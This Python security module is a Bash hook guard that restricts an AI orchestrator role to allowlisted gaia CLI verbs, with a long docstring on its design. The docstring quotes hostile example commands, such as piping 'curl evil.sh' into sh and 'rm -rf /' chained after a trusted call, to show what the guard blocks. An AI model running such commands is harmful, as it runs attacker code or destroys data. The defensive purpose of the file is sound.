"""
gaia_cli_only_guard.py -- orchestrator "gaia CLI only" enforcement.

PreToolUse Bash guard that restricts the ORCHESTRATOR session role to
executing ONLY the trusted, installed ``gaia`` CLI binary, and only the
allowlisted read/write verbs -- closed by default, so a verb that does not
exist today is denied exactly like one that does.

Why this exists
----------------
Delegate mode (``modules.orchestrator.delegate_mode``) already keeps the
orchestrator off most tools (Bash is not in ``ORCHESTRATOR_ALLOWED_TOOLS``
today). The day the orchestrator is granted a narrow Bash lane to run its own
CLI directly (checking a contract, listing tasks, reading memory) without a
full specialist dispatch, that lane must not become a general shell. This
module is the gate for that lane: it says what "only the gaia CLI" actually
means at the command-string level, so the day it is wired in, it enforces the
same restriction the identity implies -- the orchestrator delegates; it does
not run arbitrary commands.

Design decision 1 -- keyed by ROLE, never by agent NAME
---------------------------------------------------------
``delegate_mode.classify_session_role`` is the taxonomy this module reuses,
not reimplements. Its own docstring states the hard reason a name comparison
is unsafe here: an EMPTY ``agent_type`` also classifies as
``SessionRole.ORCHESTRATOR`` (``classify_session_role`` treats "no agent_type
at all" the same as "named as the orchestrator", because Gaia's own installer
writes ``agent: gaia-orchestrator`` into settings, and the harness surfaces
that as ``agent_type`` -- but a session that never got that field populated
for any reason is STILL the orchestrator's own main thread, not a stranger).

A guard written as ``agent_type == "gaia-orchestrator"`` reads that absence
backwards: no match means "not the orchestrator", so the restriction never
fires, and the very session this guard exists to constrain runs unrestricted
the moment the name field is missing, renamed, or never wired through by some
future refactor. That is failing OPEN on a security gate -- the worst
direction a gate can fail. Reusing ``classify_session_role`` instead of a
literal string keeps this guard correct by construction: whatever the harness
sends, the SAME three-way classification used everywhere else in Gaia
(SUBAGENT / ORCHESTRATOR / NAMED_SPECIALIST) decides who this is, and an
absent field lands on the side that gets gated, not the side that gets a free
pass. This is also why ``check()`` below takes the raw ``hook_payload`` dict
rather than a pre-extracted ``is_orchestrator`` boolean: any intermediate
flattening is one more place the same "empty field reads as false" mistake
could be reintroduced between the harness and this guard.

NAMED_SPECIALIST and SUBAGENT are deliberately NOT restricted here -- the
task this guard exists for is scoped to the orchestrator role alone. A
dispatched subagent already runs with full tool access by design (delegate
mode's own SUBAGENT skip), and a ``--agent <specialist>`` main thread is
already denied nearly everything by delegate mode itself; neither needs this
guard layered on top, and folding them in would blur what this module is
answering ("is the orchestrator only running its own CLI?") with a question
delegate mode already owns.

Design decision 2 -- identity is PACKAGE PROVENANCE, not a path
--------------------------------------------------------------------------
``subagent_memory_write_guard.py`` (the structural precedent for this module)
resolves the invoked binary by BASENAME: it strips a token down to its last
path component and compares that to the literal string ``"gaia"``. That is
adequate for its own purpose (deciding whether a `gaia memory <verb>` shape
is present anywhere in the command, as a shape check), but it is exactly the
wrong tool for an identity check, and this module is forbidden from copying
it for that reason: ANY file named ``gaia`` anywhere on the filesystem --
``/tmp/x/gaia``, a script dropped in the workspace, a shadowing entry earlier
on ``$PATH`` -- has the basename ``gaia`` and would satisfy that comparison.
A guard whose entire job is "only the real gaia CLI may run" cannot itself be
fooled by a same-named file; that would be a key left under the doormat.

The first design overcorrected in the opposite direction: it realpath'd the
invoked token and required EXACT equality against the one ``bin/gaia`` that
ships alongside this very hook module (computed from ``__file__``). That
equality is a property of a LAYOUT, not of identity, and a live install
disproved it: a real workspace runs the hook module out of the installed
pnpm dev-pack under ``node_modules`` (``.claude/hooks`` symlinks there),
while the ``$PATH`` launcher is an npm-global symlink chain that resolves to
the SOURCE TREE's ``bin/gaia`` -- two genuine, simultaneously installed
copies of the same package, two distinct real paths, so the guard denied the
legitimate CLI, including its own. Multiple concurrent genuine installs are
the NORMAL condition of this workspace (the ``.pnpm`` store carries one new
hash-named package root per dev-pack build), which also rules out the
obvious repair of a trusted-locations SET: any enumerated set is stale after
the next ``pack``, on the next machine, and for the next layout -- it rots
by construction, and a rotten allowlist on a security gate fails open or
fails useless.

So identity is verified by PROVENANCE: *the trusted gaia CLI is any file
that a genuinely installed gaia package -- the same npm package this hook
module itself ships in, by name -- declares as its own ``gaia`` executable.*

  1. The token in the binary position of a command component must already be
     an ABSOLUTE path in the command text as written (``os.path.isabs``).
     A bare word (``gaia``) relies on a ``$PATH`` lookup this guard does not
     perform: resolving it here would mean trusting the AMBIENT environment
     at hook-analysis time, which need not be the same environment the
     command actually runs under, and could itself have been poisoned by an
     earlier command in the same session (e.g. a prior ``export PATH=...``).
     A relative path (``./gaia``, ``bin/gaia``) is cwd-dependent, and this
     guard does not track ``cd`` state (that is ``bash_validator``'s
     compound-cwd threading, out of this module's scope) -- resolving a
     relative token would mean guessing a cwd this module cannot verify.
     Both are rejected outright rather than approximated.
  2. The absolute token is resolved with ``os.path.realpath`` (follows every
     symlink in the chain) to a real file R. R must exist.
  3. Walking UP from R, the NEAREST directory containing a ``package.json``
     is taken as R's declaring package root -- npm's own resolution rule.
     No ``package.json`` above R means R belongs to no package: denied.
  4. That manifest's ``name`` must equal ``TRUSTED_PACKAGE_NAME`` -- the
     ``name`` read at import time from the ``package.json`` of the package
     THIS module ships in (``__file__`` walked up to the package root). The
     expected name is never hard-coded: the module asks "what package am I?"
     and demands the invoked binary belong to a package of the same name, so
     a rename of the npm package updates both sides of the comparison in the
     same commit. If this module's own manifest is missing or unreadable,
     ``TRUSTED_PACKAGE_NAME`` is ``None`` and EVERY candidate is denied --
     failing closed, never open.
  5. The manifest's own ``bin`` entry for ``gaia`` must realpath-resolve to
     EXACTLY R. This is the load-bearing link: it is not enough for R to
     live somewhere inside a gaia package (that would trust every file in
     the tree); the package itself must declare R as its gaia executable.

  Steps 2-5 fail closed on every doubt: unreadable or unparseable manifest,
  name mismatch, missing/odd ``bin`` field, ``bin`` resolving elsewhere, and
  any ``OSError`` all deny. A pnpm-global SHELL-SHIM launcher (pnpm writes a
  wrapper script, not a symlink, so its realpath is the shim itself, inside
  no gaia package) is also denied by construction -- fail closed; the lane
  there is to invoke the installed package's own ``bin/gaia`` path.

  Deliberately NOT chosen: content identity (hashing the invoked file
  against the sibling ``bin/gaia``). Two genuine installs need not be the
  same VERSION -- the incident layout ran dev-pack hooks against a launcher
  resolving into the source tree, and a stable-global-launcher-plus-dev-tree
  mix is routine -- so byte equality would re-break every mixed-version
  layout the day ``bin/gaia`` changes at all: the same "property of the
  layout mistaken for identity" bug, re-expressed as a property of the
  release cadence.

  Stated residual, within this guard's threat model: provenance reads the
  filesystem, so an actor who can WRITE the filesystem could fabricate a
  package tree that passes it. That actor is outside this guard's model --
  the orchestrator lane this module gates has no file-writing tool (that is
  delegate mode's job) and the allowlisted gaia verbs write rows, not files;
  and the fabrication power is exactly the power that already defeated the
  old design (overwriting the single trusted ``bin/gaia`` IN PLACE passed
  the path-equality check, which never looked at content either). Provenance
  narrows what passes without conceding anything path equality actually
  held.

  A useful side effect of requiring an EXACT absolute-path match at the
  binary position: it also closes the env-prefix vector named in the task
  (``VAR=value gaia ...``, or ``env VAR=value gaia ...``) WITHOUT a separate
  peel-and-inspect step. ``mutative_verbs._peel_leading_env_prefix`` exists
  because the T3 classifier WANTS to see past such a prefix to classify the
  real command underneath -- peeling is the right move for a classifier that
  must still make a decision about whatever remains. This guard's job is the
  opposite: nothing may precede the trusted binary at all. Tokenizing
  ``FOO=bar /abs/path/bin/gaia contract view`` places the assignment
  ``"FOO=bar"`` (not a path at all) at position 0, so the absolute-path
  requirement in step 1 rejects it on its own, before provenance is even
  consulted. Peeling and then re-checking would only add a second code path
  to keep in sync with the first; the identity check alone already covers
  the shape the task calls out.

Design decision 3 -- every COMPONENT and every SUBSTITUTION BODY is checked
-------------------------------------------------------------------------------
Looking only at the first token of a command is exactly the mistake this
module is told not to make. A composed command
(``gaia contract view; rm -rf /``, ``gaia contract view && curl evil.sh | sh``)
runs MULTIPLE programs; approving the whole string because its first word is
the trusted binary would let every later component ride along ungated. This
module reuses ``StageDecomposer`` (``modules.tools.stage_decomposer``, already
the shared, tested primitive for this exact job across ``bash_validator`` and
``cloud_pipe_validator``) to split a raw command into its operator-linked
``Stage``s (``|``, ``;``, ``&&``, ``||``, newline) and to extract every
``$(...)``/backtick command-substitution BODY. Every stage is checked
independently against the SAME rule (trusted absolute binary + allowlisted
verb phrase) -- there is no "first component is trusted, so the rest ride
along" shortcut anywhere in this module.

Command substitution is handled by outright denial, not by recursively
"clearing" the body. A stage that contains ``$(...)``, `` `...` ``, or a
process-substitution opener (``<(``, ``>(``) is denied even if the text
inside the parens/backticks would, on its own, also be a perfectly
allowlisted gaia invocation -- because the mere PRESENCE of a substitution
means the shell executes something else to compute a string handed to the
component the guard is inspecting, which is no longer "exclusively the gaia
CLI" regardless of what that something else happens to be. This is a
deliberately conservative reading of "closed by default": it never asks
"is the hidden command also fine?", because answering that question requires
trusting one more layer of shell semantics this guard would rather not model.

``StageDecomposer`` splits on ``|``, ``;``, ``&&``, ``||`` and newline, but --
by its own documented scope -- NOT on a bare background ``&`` (only the
two-character ``&&``). A lone ``&`` left unhandled would let
``gaia contract view & rm -rf /`` slip through as one "stage" whose trailing
tokens (``&``, ``rm``, ``-rf``, ``/``) look like harmless extra arguments to
the phrase-matching step below, because that step only checks a PREFIX of the
non-flag tokens and does not care what comes after. Modifying
``stage_decomposer.py`` to close that gap is out of this module's scope (this
task creates one file and touches nothing else), so this module carries its
own small, quote-and-substitution-aware scan for a bare ``&`` (and for a
process-substitution opener) and denies the whole command outright if either
is found -- duplicated logic, deliberately, rather than a shared file edited
under a task that forbids editing it.

Scope of the check (categorical, NOT approvable)
--------------------------------------------------
Like ``subagent_memory_write_guard`` / ``gaia_db_write_guard``, this is a
categorical deny with no ``approval_id`` -- there is no T3-style grant that
lifts it. An orchestrator session has no legitimate reason to run a command
this guard rejects; the correct move is to dispatch a specialist, not to seek
consent for a wider shell.

This module IS wired into ``bash_validator.py``: ``BashValidator.validate()``
calls ``check()`` here as Phase 0, the very first statement of ``validate()``,
ahead of the empty-command check, footer stripping, the three write guards,
and normalization. It is inert today for a different reason -- not because
the wiring is missing, but because the orchestrator has not yet been granted
a Bash lane at all (``delegate_mode`` keeps Bash out of
``ORCHESTRATOR_ALLOWED_TOOLS``), so Phase 0 never sees an orchestrator-role
invocation to evaluate. The day that lane opens, this guard is already live
with no further wiring change required.

Public API:
    TRUSTED_PACKAGE_NAME: Optional[str]
    ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]]
    ALLOWED_WRITE_PHRASES: FrozenSet[Tuple[str, ...]]
    ALLOWED_PHRASES: FrozenSet[Tuple[str, ...]]
    EXPLICITLY_DENIED_PHRASES: FrozenSet[Tuple[str, ...]]
    is_orchestrator_role(hook_payload) -> bool
    is_trusted_gaia_binary(token) -> bool
    check(command, hook_payload) -> tuple[bool, str | None]
"""

from __future__ import annotations

import json
import os
from typing import Any, Dict, FrozenSet, Optional, Tuple

from ..tools.stage_decomposer import StageDecomposer

# ---------------------------------------------------------------------------
# Trusted binary identity (Design decision 2 -- see module docstring)
# ---------------------------------------------------------------------------

# The real, on-disk directory containing THIS file, with every symlink in the
# chain resolved -- so the package root below is the root of whichever real
# package this module is running from (source tree, or an installed copy
# under node_modules that ``.claude/hooks`` symlinks into).
_MODULE_DIR = os.path.dirname(os.path.realpath(__file__))

# hooks/modules/security -> hooks/modules -> hooks -> <package root>
_PACKAGE_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(_MODULE_DIR)))


def _read_package_manifest(package_root: str) -> Optional[Dict[str, Any]]:
    """Return *package_root*'s parsed ``package.json`` dict, or None.

    None on any doubt -- missing file, unreadable, unparseable, or a JSON
    document that is not an object. Callers treat None as a denial.
    """
    manifest_path = os.path.join(package_root, "package.json")
    try:
        with open(manifest_path, encoding="utf-8") as fh:
            data = json.load(fh)
    except (OSError, ValueError):
        return None
    return data if isinstance(data, dict) else None


def _own_package_name() -> Optional[str]:
    """The npm package name this hook module itself ships in, or None."""
    manifest = _read_package_manifest(_PACKAGE_ROOT)
    if manifest is None:
        return None
    name = manifest.get("name")
    if isinstance(name, str) and name.strip():
        return name
    return None


# The identity anchor: not a path, the NAME of the package this module ships
# in, read from its own manifest at import time. None (own manifest missing
# or unreadable) makes is_trusted_gaia_binary() deny everything -- closed.
TRUSTED_PACKAGE_NAME: Optional[str] = _own_package_name()


def _find_declaring_package_root(real_file: str) -> Optional[str]:
    """Nearest ancestor directory of *real_file* containing a package.json.

    npm's own resolution rule: the nearest manifest wins, and the walk stops
    there -- a mismatching nearest manifest is a denial, never a reason to
    keep climbing toward a manifest that would match.
    """
    directory = os.path.dirname(real_file)
    while True:
        if os.path.isfile(os.path.join(directory, "package.json")):
            return directory
        parent = os.path.dirname(directory)
        if parent == directory:
            return None
        directory = parent


def _declared_gaia_bin(package_root: str, manifest: Dict[str, Any]) -> Optional[str]:
    """Realpath of the file *manifest* declares as its ``gaia`` executable.

    Handles npm's two ``bin`` forms: the object form (``{"gaia": "bin/gaia"}``,
    the form this package publishes) and the string form, which npm names
    after the package's unscoped basename -- accepted only when that basename
    is exactly ``gaia``. Anything else (missing ``bin``, no ``gaia`` entry,
    non-string value) returns None, which callers treat as a denial.
    """
    bin_field = manifest.get("bin")
    bin_rel: Optional[str] = None
    if isinstance(bin_field, dict):
        candidate = bin_field.get("gaia")
        if isinstance(candidate, str):
            bin_rel = candidate
    elif isinstance(bin_field, str):
        name = manifest.get("name")
        if isinstance(name, str) and name.rsplit("/", 1)[-1] == "gaia":
            bin_rel = bin_field
    if not bin_rel or not bin_rel.strip():
        return None
    return os.path.realpath(os.path.join(package_root, bin_rel))


def is_trusted_gaia_binary(token: str) -> bool:
    """Return True iff *token* is, by package provenance, the trusted gaia CLI.

    Trusted means: *token* is absolute as written, and its realpath is the
    very file that a genuinely installed package named
    :data:`TRUSTED_PACKAGE_NAME` declares as its own ``gaia`` executable
    (Design decision 2 -- steps 2-5). Rejects a bare word (no ``$PATH``
    lookup is performed), a relative path (cwd-dependent, and this module
    does not track ``cd`` state), a same-named file that belongs to no such
    package, and a file that merely lives INSIDE such a package without
    being its declared ``gaia`` bin entry. Fails closed on every doubt,
    including when this module's own package name could not be established.
    """
    if not token or not os.path.isabs(token):
        return False
    if TRUSTED_PACKAGE_NAME is None:
        return False
    try:
        real = os.path.realpath(token)
        if not os.path.isfile(real):
            return False
        package_root = _find_declaring_package_root(real)
        if package_root is None:
            return False
        manifest = _read_package_manifest(package_root)
        if manifest is None:
            return False
        if manifest.get("name") != TRUSTED_PACKAGE_NAME:
            return False
        declared = _declared_gaia_bin(package_root, manifest)
        return declared is not None and declared == real
    except OSError:
        return False


# ---------------------------------------------------------------------------
# Verb allowlists (Design decision "closed by default")
# ---------------------------------------------------------------------------
# Each entry is the exact token sequence of a subcommand PATH as gaia's own
# argparse subparsers name it (verified against bin/cli/*.py's add_parser
# calls, not guessed from convention) -- e.g. ("task", "gate", "list") for
# the three-level ``gaia task gate list``. Matching is by PREFIX against the
# tokens that follow the trusted binary (see match_allowed_phrase): anything
# after a matched phrase (an id, a search string, a per-command flag) is
# gaia's own argument grammar and is not re-validated here.

ALLOWED_READ_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
    ("contract", "view"),
    ("contract", "list"),
    ("contract", "validate"),
    ("task", "list"),
    ("task", "gate", "list"),
    ("plan", "show"),
    ("plan", "list"),
    ("brief", "show"),
    ("brief", "list"),
    ("brief", "deps"),
    ("brief", "search"),
    ("notifications", "list"),
    ("notifications", "show"),
    ("memory", "search"),
    ("memory", "show"),
    ("memory", "list"),
    ("memory", "stats"),
    ("memory", "get-relevant"),
    ("memory", "conflicts"),
    ("memory", "episode-show"),
    ("memory", "story"),
    ("history",),
    ("metrics",),
    # approvals read verbs: reading an approval grants nothing and revokes
    # nothing -- these five are T0 by security-tiers' own classification
    # (get/list/describe/show semantics, no state mutated). Without them the
    # orchestrator had to burn a whole specialist dispatch just to have
    # something ELSE read back a grant it cannot itself change. The asymmetry
    # with EXPLICITLY_DENIED_PHRASES below is deliberate: approve/replay
    # GRANT capability, revoke/reject/reject-all DISCARD it, and clean
    # mutates the approval store's own rows -- all six change what the
    # approval system can later do, which is exactly why they stay denied
    # while these five, which only observe, are let through.
    ("approvals", "list"),
    ("approvals", "pending"),
    ("approvals", "show"),
    ("approvals", "history"),
    ("approvals", "stats"),
})

ALLOWED_WRITE_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
    ("memory", "add"),
    ("memory", "append"),
    ("memory", "reclassify"),
    ("memory", "link"),
    ("memory", "checkpoint"),
})

ALLOWED_PHRASES: FrozenSet[Tuple[str, ...]] = ALLOWED_READ_PHRASES | ALLOWED_WRITE_PHRASES

# Named on purpose, even though default-deny already rejects anything not in
# ALLOWED_PHRASES: these are the verbs someone is most likely to add to the
# allowlist later without re-reading this file's reasoning -- a plausible
# "just let the orchestrator ack a notification too" kind of change. Keeping
# them enumerated, with the reason attached, is the tripwire that makes that
# future edit a deliberate decision instead of an accidental widening.
# Mutating task state, granting/replaying/discarding approval grants, editing
# or deleting memory, and every contract-authoring verb (set/add/fill/
# finalize) are mutations that belong to a specialist's own governed path (or
# to the orchestrator's OWN existing curated-memory writer path, not to a bare
# CLI invocation slipped past this guard) -- none of them are "read my own
# state" or the five narrow memory-curation writes this guard exists to
# allow.
#
# The approvals six split cleanly along the read/write line this guard
# enforces, and that line is NOT the same line security-tiers draws for T3:
# per security-tiers, ``revoke``/``reject``/``reject-all``/``clean`` are
# themselves NOT T3 (they only revoke or discard a grant Gaia itself issued,
# never reaching outside the local approval store -- see
# CONSENT_REDUCING_SUBCOMMAND_EXCEPTIONS), while ``approve`` stays T3 because
# it grants capability without the AskUserQuestion flow. But this guard is
# narrower than the T3 gate: it allows the orchestrator's bare CLI lane only
# the verbs that read an approval's state back, never one that writes a row
# in the approvals store -- and all six of these write a row (a grant, a
# replay-of-execution, or a discard), whether or not that write also happens
# to need the user's consent. So all six stay denied here, deliberately, for
# a reason narrower than "is this T3": approving/replaying GRANT capability,
# revoking/rejecting/reject-all/clean DISCARD or clear it, and every one of
# those six is still a write to state this guard's allowlist does not open,
# even the ones security-tiers itself does not gate behind approval.
EXPLICITLY_DENIED_PHRASES: FrozenSet[Tuple[str, ...]] = frozenset({
    ("task", "set-status"),
    ("task", "add"),
    ("task", "remove"),
    ("task", "reorder"),
    ("task", "gate", "add"),
    ("task", "gate", "remove"),
    ("task", "gate", "set-status"),
    ("approvals", "approve"),
    ("approvals", "replay"),
    ("approvals", "revoke"),
    ("approvals", "reject"),
    ("approvals", "reject-all"),
    ("approvals", "clean"),
    ("memory", "edit"),
    ("memory", "delete"),
    ("contract", "set"),
    ("contract", "add"),
    ("contract", "fill"),
    ("contract", "finalize"),
})


def match_allowed_phrase(
    candidate: Tuple[str, ...],
    phrases: FrozenSet[Tuple[str, ...]] = ALLOWED_PHRASES,
) -> Optional[Tuple[str, ...]]:
    """Return the phrase in *phrases* that is a prefix of *candidate*, else None.

    Matching is by PREFIX, not exact-length equality: ``("memory", "show",
    "42")`` still matches ``("memory", "show")`` because the trailing ``"42"``
    is a positional argument (the id), not a further subcommand. Phrase
    tuples of different arities never collide under this rule -- a 2-tuple
    and a 3-tuple are only ever compared against candidate slices of their
    own length.
    """
    for phrase in phrases:
        if candidate[: len(phrase)] == phrase:
            return phrase
    return None


# ---------------------------------------------------------------------------
# Composition hazards StageDecomposer does not surface on its own
# (Design decision 3 -- see module docstring)
# ---------------------------------------------------------------------------

def _find_composition_hazard(command: str) -> Optional[str]:
    """Scan *command* for a bare background ``&`` or a process-substitution
    opener (``<(`` / ``>(``), outside quotes and outside ``$(...)``/backtick
    substitution bodies (those are already denied separately by their mere
    presence -- this scan exists for the hazards a substitution check does
    NOT cover).

    Returns a short reason string naming the hazard, or None when clean.

    This duplicates the quote/paren/backtick tracking in
    ``StageDecomposer._split_with_operators`` rather than extending that
    shared file -- this task creates exactly one new file and edits nothing
    else, so a real gap in a shared parser (it does not split on a bare
    ``&``) is closed here, locally, instead of there.
    """
    in_single = False
    in_double = False
    paren_depth = 0
    backtick_depth = 0
    i = 0
    n = len(command)

    while i < n:
        ch = command[i]

        if ch == "\\" and not in_single and i + 1 < n:
            i += 2
            continue

        if ch == "'" and not in_double:
            in_single = not in_single
            i += 1
            continue

        if ch == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue

        if in_single or in_double:
            i += 1
            continue

        if ch == "$" and i + 1 < n and command[i + 1] == "(":
            paren_depth += 1
            i += 2
            continue

        if ch == "(" and paren_depth > 0:
            paren_depth += 1
            i += 1
            continue

        if ch == ")" and paren_depth > 0:
            paren_depth -= 1
            i += 1
            continue

        if ch == "`":
            backtick_depth = 0 if backtick_depth else 1
            i += 1
            continue

        if paren_depth > 0 or backtick_depth > 0:
            i += 1
            continue

        if ch in ("<", ">") and i + 1 < n and command[i + 1] == "(":
            return "process substitution (`<(` / `>(`) detected"

        if ch == "&":
            nxt = command[i + 1] if i + 1 < n else ""
            if nxt == "&":
                i += 2
                continue
            return "bare background operator (`&`) detected"

        i += 1

    return None


# ---------------------------------------------------------------------------
# Role gate (Design decision 1 -- see module docstring)
# ---------------------------------------------------------------------------

def is_orchestrator_role(hook_payload: Dict[str, Any]) -> bool:
    """Return True iff *hook_payload* classifies as the ORCHESTRATOR role.

    Delegates entirely to ``delegate_mode.classify_session_role`` -- the one
    place Gaia's (agent_id, agent_type) taxonomy lives -- rather than
    inspecting either field directly here. Imported lazily (function-local),
    matching the convention already used at this module's real call site
    (``hooks/adapters/claude_code.py`` imports
    ``modules.orchestrator.delegate_mode`` the same way) and avoiding any
    import-order assumption between the two packages.
    """
    from ..orchestrator.delegate_mode import SessionRole, classify_session_role

    return classify_session_role(hook_payload) is SessionRole.ORCHESTRATOR


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def check(
    command: str,
    hook_payload: Dict[str, Any],
) -> Tuple[bool, Optional[str]]:
    """Main entrypoint for PreToolUse Bash guard integration.

    Args:
        command: The Bash command line about to run.
        hook_payload: The full stdin JSON dict from the harness (the same
            shape ``delegate_mode.classify_session_role`` expects) -- NOT a
            pre-extracted role flag. See Design decision 1 above for why the
            raw payload is required here rather than a derived boolean.

    Returns:
        (allowed, reason)
        - (True, None) when the caller is not the ORCHESTRATOR role (this
          guard does not restrict SUBAGENT or NAMED_SPECIALIST), or the
          command is a composition where every component is a trusted,
          absolute-path gaia invocation of an allowlisted verb phrase.
        - (False, reason) otherwise -- categorical, not approvable.
    """
    if not is_orchestrator_role(hook_payload):
        return True, None

    if not command or not command.strip():
        return False, "Empty command is not an allowlisted gaia CLI invocation."

    hazard = _find_composition_hazard(command)
    if hazard is not None:
        return False, (
            f"GAIA CLI ONLY: {hazard} in orchestrator command. The orchestrator "
            f"may run only single, trusted invocations of the gaia CLI -- "
            f"background execution and process substitution both run more "
            f"than the gaia CLI and are denied outright, not approvable."
        )

    decomposed = StageDecomposer().decompose(command)

    if decomposed.substitutions:
        return False, (
            "GAIA CLI ONLY: command substitution detected "
            f"(body/bodies: {decomposed.substitutions!r}). A substitution "
            "runs an additional command to compute a string, even when its "
            "own body would itself be an allowlisted gaia invocation -- "
            "the orchestrator may run only the gaia CLI, exclusively, with "
            "nothing else executing to feed it. Denied outright, not "
            "approvable."
        )

    if not decomposed.stages:
        return False, "GAIA CLI ONLY: command did not decompose into any stage."

    for stage in decomposed.stages:
        allowed, reason = _check_stage(stage)
        if not allowed:
            return False, reason

    return True, None


def _check_stage(stage) -> Tuple[bool, Optional[str]]:
    """Validate one composition component (a ``Stage`` from ``StageDecomposer``).

    Every component of a composition must independently be a trusted,
    absolute-path gaia invocation of an allowlisted verb phrase -- there is
    no shortcut where one legitimate component vouches for the rest.
    """
    args = stage.args
    if not args:
        return False, "GAIA CLI ONLY: empty command component."

    binary = args[0]
    if not is_trusted_gaia_binary(binary):
        return False, (
            f"GAIA CLI ONLY: '{binary}' is not the trusted gaia CLI "
            f"(expected an absolute path whose realpath is the declared "
            f"'gaia' executable of an installed {TRUSTED_PACKAGE_NAME!r} "
            f"package). A bare command name, a relative path, an env-var "
            f"prefix, or a binary no such package declares all fail this "
            f"identity check by design -- see gaia_cli_only_guard.py for "
            f"why. Denied outright, not approvable."
        )

    rest = args[1:]
    i = 0
    while i < len(rest) and rest[i].startswith("-"):
        i += 1
    candidate = tuple(rest[i:])

    if match_allowed_phrase(candidate, ALLOWED_PHRASES) is not None:
        return True, None

    denied = match_allowed_phrase(candidate, EXPLICITLY_DENIED_PHRASES)
    if denied is not None:
        return False, (
            f"GAIA CLI ONLY: 'gaia {' '.join(denied)}' is explicitly excluded "
            f"from the orchestrator's allowlist (a mutation that belongs to a "
            f"specialist's own governed path, not a bare CLI call). Denied "
            f"outright, not approvable."
        )

    shown = " ".join(candidate) if candidate else "<no subcommand>"
    return False, (
        f"GAIA CLI ONLY: 'gaia {shown}' is not on the orchestrator's verb "
        f"allowlist. Closed by default -- a verb absent from the allowlist "
        f"is denied exactly like one that does not exist yet. Denied "
        f"outright, not approvable."
    )
